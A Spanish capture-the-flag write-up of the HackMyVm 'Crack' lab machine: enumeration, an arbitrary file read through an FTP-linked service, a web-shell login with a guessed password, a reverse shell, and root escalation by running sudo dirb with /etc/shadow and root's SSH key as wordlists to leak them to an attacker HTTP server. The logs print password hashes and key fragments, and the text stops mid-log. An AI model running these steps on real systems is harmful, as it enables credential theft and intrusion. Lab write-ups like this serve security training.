---
date: 2023-06-09 12:00:00
layout: post
title: Crack Writeup
subtitle: Writeup de la máquina Crack de la plataforma HackMyVm
description: Realizaré la máquina Crack explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Easy.
image: /assets/img/machines/Crack/crack-HackMyVm.png
optimized_image: /assets/img/machines/Crack/crack-HackMyVm.png
category: Writeup
tags:
  - HackMyVm
  - Writeup
  - Linux
author: FredBrave
---
# Enumeración
Iniciamos encontrando la ip de la máquina en nuestro segmento de red con la herramienta arp-scan.
```bash
sudo arp-scan 10.0.2.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:ec:3f:6c, IPv4: 10.0.2.48
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1	52:54:00:12:35:00	QEMU
10.0.2.2	52:54:00:12:35:00	QEMU
10.0.2.3	08:00:27:56:2e:58	PCS Systemtechnik GmbH
10.0.2.123	08:00:27:e4:41:a7	PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.054 seconds (124.63 hosts/sec). 4 responded
```
Una vez encontrada esta ip realizamos dos escaneos hacia esta, el primero será un escaneo rápido con la intención de encontrar puertos abiertos y el segundo será un escaneo exhaustivo hacia los puertos abiertos encontrados para enumerar sus servicios y versiones.
```bash
$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.0.2.123 -oG Targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 11:03 EDT
Nmap scan report for 10.0.2.123
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
4200/tcp  open  vrml-multi-use
12359/tcp open  unknown
MAC Address: 08:00:27:E4:41:A7 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds

$ sudo nmap -p21,4200,12359 -sCV 10.0.2.123 -oN Target 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 11:05 EDT
Nmap scan report for 10.0.2.123
Host is up (0.00059s latency).

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Jun 07 14:40 upload [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.48
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
4200/tcp  open  ssl/http ShellInABox
| ssl-cert: Subject: commonName=crack
| Not valid before: 2023-06-07T10:20:13
|_Not valid after:  2043-06-02T10:20:13
|_http-title: Shell In A Box
|_ssl-date: TLS randomness does not represent time
12359/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     File to read:NOFile to read:
|   NULL: 
|_    File to read:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port12359-TCP:V=7.93%I=7%D=6/9%Time=64833FD9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,D,"File\x20to\x20read:")%r(GenericLines,1C,"File\x20to\x20read:NOFil
SF:e\x20to\x20read:");
MAC Address: 08:00:27:E4:41:A7 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.21 seconds
```
Del resultado de los escaneos podemos observar que el ftp está abierto y con el usuario anonymous activado además de la subida de archivos permitido. El puerto 4200 parece ser un https debido a que el escaneo me dice algo de ssl/http y también. Y el puerto 12359 que parece ser algo bastante curioso.

Empezaremos con el ftp entrando a este podemos encontrar una carpeta upload y dentro de esta un archivo .py.
```bash
ftp 10.0.2.123
Connected to 10.0.2.123.
220 (vsFTPd 3.0.3)
Name (10.0.2.123:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||28362|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 09 17:17 upload
226 Directory send OK.
ftp> cd upload
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||45561|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07 14:40 crack.py
226 Directory send OK.
ftp>
```
Descargaremos este archivo para poder analizarlo.
```bash
ftp> get crack.py
local: crack.py remote: crack.py
229 Entering Extended Passive Mode (|||34314|)
150 Opening BINARY mode data connection for crack.py (849 bytes).
100% |*************************************************************************************************************************************************************************************************|   849        1.32 MiB/s    00:00 ETA
226 Transfer complete.
849 bytes received in 00:00 (711.06 KiB/s)
ftp> 
```
```bash
cat crack.py 
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359
s.bind(('', port))
s.listen(50)

c, addr = s.accept()
no = "NO"
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file)
                check = "/srv/ftp/upload/"+filename
                if os.path.isfile(check) and os.path.isfile(file):
                        f = open(file,"r")
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass
```
Analizándolo a profundidad parece ser un script que corre en el puerto 12359 este nos pedirá un archivo del sistema y si este archivo también existe en la ruta /srv/ftp/upload nos mandara el contenido del archivo existente en el sistema.
# Lectura de archivos del sistema (Se puede omitir...)
Entendiendo como funciona trataremos de leer el /etc/passwd de la máquina. Primero crearemos un archivo llamado passwd con cualquier contenido y lo subiremos a la carpeta upload del ftp.
```bash
$ echo 'a' > passwd
$ ftp 10.0.2.123
Connected to 10.0.2.123.
220 (vsFTPd 3.0.3)
Name (10.0.2.123:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd upload
250 Directory successfully changed.
ftp> put passwd
ftp> ls
229 Entering Extended Passive Mode (|||12286|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07 14:40 crack.py
-rw-------    1 107      114             2 Jun 09 17:17 passwd
226 Directory send OK.
```
Y ahora nos conectaremos al puerto 12359 de la máquina para tratar de leer el archivo /etc/passwd
```bash
nc 10.0.2.123 12359
File to read:/etc/passwd
['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n']File to read:

$ echo -e 'root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n'
root:x:0:0:root:/root:/bin/bash
, daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
, bin:x:2:2:bin:/bin:/usr/sbin/nologin
, sys:x:3:3:sys:/dev:/usr/sbin/nologin
, sync:x:4:65534:sync:/bin:/bin/sync
, games:x:5:60:games:/usr/games:/usr/sbin/nologin
, man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
, lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
, mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
, news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
, uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
, proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
, www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
, backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
, list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
, irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
, gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
, nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
, _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
, systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
, systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
, messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
, systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
, sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
, cris:x:1000:1000:cris,,,:/home/cris:/bin/bash
, systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
, shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin
, ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```
Y tenemos lectura de archivos del sistema.
# Shell como Cris
La lectura de archivos esta bastante bien, pero como no encontré nada interesante con esta, por lo que me fui a enumerar el puerto 4200 que tenía buena pinta.
<img class="img" src="/assets/img/machines/Crack/1.png" width="1000">
Era una web shell que pide un login.

Como no sabía la clave de cris intente usar su mismo usuario como clave y funciono.
<img class="img" src="/assets/img/machines/Crack/2.png" width="1000">
Con esta shell no me sentía a gusto así que me mande una reverse shell con el típico payload a mí máquina.
<img class="img" src="/assets/img/machines/Crack/3.png" width="1000">
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.0.2.48] from (UNKNOWN) [10.0.2.123] 48394
cris@crack:~$
```
Hice un tratamiento de la tty.
```bash
cris@crack:~$ script /dev/null -c bash
script /dev/null -c bash
Script iniciado, el fichero de anotación de salida es '/dev/null'.
cris@crack:~$ ^Z
[1]  + 4783 suspended  nc -nlvp 443
CTRL + Z
stty raw -echo;fg
[1]  + 4783 continued  nc -nlvp 443

cris@crack:~$ export TERM=xterm
cris@crack:~$ export SHELL=bash
cris@crack:~$ stty rows 48 columns 238
cris@crack:~$
```
# Shell como root
Al parecer puedo ejecutar dirb como cualquier usuario.
```bash
cris@crack:~$ sudo -l
Matching Defaults entries for cris on crack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cris may run the following commands on crack:
    (ALL) NOPASSWD: /usr/bin/dirb
cris@crack:~$
```
Dirb es un fuzzer para webs así que ya me podía imaginar como aprovecharme de esto. Lo que hice fue ejecutar un servidor web con python en mí máquina y luego tratar de fuzzearlo usando como diccionario algún archivo del sistema con información privilegiada.
```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```bash
cris@crack:~$ sudo -u root /usr/bin/dirb http://10.0.2.48/ /etc/shadow

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jun  9 18:01:07 2023
URL_BASE: http://10.0.2.48/
WORDLIST_FILES: /etc/shadow

-----------------

GENERATED WORDS: 28                                                            

---- Scanning URL: http://10.0.2.48/ ----
                                                                                                                                                                                                                                             
-----------------
END_TIME: Fri Jun  9 18:01:07 2023
DOWNLOADED: 28 - FOUND: 0
cris@crack:~$
```
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /randomfile1 HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /frand2 HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /root:$y$j9T$LVT9GIrLdk5L.xns1akJZ1$wmigJ7er07AT/VwIAuYSZ3j94LOCe8EJHC6d2mlZVo3:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /daemon:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /bin:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /sys:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /sync:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /games:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /man:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /lp:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /mail:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /news:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /uucp:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /proxy:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /www-data:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /backup:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /list:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /irc:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /gnats:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /nobody:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /_apt:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /systemd-network:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /systemd-resolve:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /messagebus:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /systemd-timesync:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /sshd:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /cris:$y$j9T$kFXVxpRhH2ZAeDGNazqRq/$IokBR4XhhyRJOur8YOHu3fF59/0NOHC5AIsvkxXx8..:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /systemd-coredump:!*:19515:::::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /shellinabox:*:19515:0:99999:7::: HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:01:07] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:01:07] "GET /ftp:*:19515:0:99999:7::: HTTP/1.1" 404 -
```
Y tenemos el hash de root.

Aquí intente conseguir la clave de root con el hash, pero por alguna razón nunca logre romperlo por lo cual decidí empezar a buscar otras formas de escalar.

Enumerando encontre que el puerto 22 estaba abierto dentro de la maquina.
```bash
cris@crack:~$ ss -nltp
State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                                             
LISTEN                   0                        50                                               0.0.0.0:12359                                           0.0.0.0:*                       users:(("python3",pid=641,fd=3))                   
LISTEN                   0                        128                                              0.0.0.0:4200                                            0.0.0.0:*                                                                          
LISTEN                   0                        128                                            127.0.0.1:22                                              0.0.0.0:*                                                                          
LISTEN                   0                        32                                                     *:21                                                    *:*                                                                          
cris@crack:~$
```
Esto me dio la idea de tratar de encontrar la id\_rsa de root. Por lo cual prosegui a usar la id\_rsa como diccionario.
```bash
cris@crack:~$ sudo -u root /usr/bin/dirb http://10.0.2.48/ /root/.ssh/id_rsa

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jun  9 18:05:34 2023
URL_BASE: http://10.0.2.48/
WORDLIST_FILES: /root/.ssh/id_rsa

-----------------

GENERATED WORDS: 38                                                            

---- Scanning URL: http://10.0.2.48/ ----
                                                                                                                                                                                                                                             
-----------------
END_TIME: Fri Jun  9 18:05:34 2023
DOWNLOADED: 38 - FOUND: 0
cris@crack:~$
```
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /randomfile1 HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /frand2 HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /-----BEGIN HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
